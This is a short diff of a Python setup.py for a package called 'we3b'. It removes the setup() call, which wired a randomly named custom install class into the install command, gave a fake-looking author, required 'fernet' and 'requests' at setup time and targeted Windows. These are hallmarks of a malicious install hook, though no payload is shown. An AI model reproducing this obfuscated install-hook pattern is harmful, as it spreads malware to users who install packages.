@@ -18,22 +18,5 @@ class xrVqeXeNokDdrdXhcpNSLbwZSvnfnceVyBLOjdhfMQfcanAMammSiemyVYDUISVxjMehntxlwG
             install.run(self)
 
 
-setup(
-    name="we3b",
-    version=VERSION,
-    author="OTRcHuAboWM",
-    author_email="iJSXpkVtOaEX@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': xrVqeXeNokDdrdXhcpNSLbwZSvnfnceVyBLOjdhfMQfcanAMammSiemyVYDUISVxjMehntxlwGMkxOlsgNpbixNvwfVpulGDXIAzQhlNRv,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
 
